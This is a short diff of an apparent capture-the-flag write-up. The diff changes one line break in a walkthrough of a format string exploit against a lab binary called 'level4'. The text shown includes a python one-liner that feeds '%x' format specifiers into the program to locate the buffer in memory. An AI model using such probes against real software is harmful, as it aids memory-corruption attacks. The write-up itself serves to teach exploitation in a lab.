@@ -1,5 +1,5 @@
 We can write in a buffer that will be printed with `printf`, and we know about format string exploit. \
-Here are the first few steps to exploit a format string outside of gdb: \
+Here are the first few steps to exploit a format string outside of gdb:
 ```shell
 $ # find where our buffer is written in memory:
 $ python -c 'print "AAAA " + "%x " * 15' | ./level4
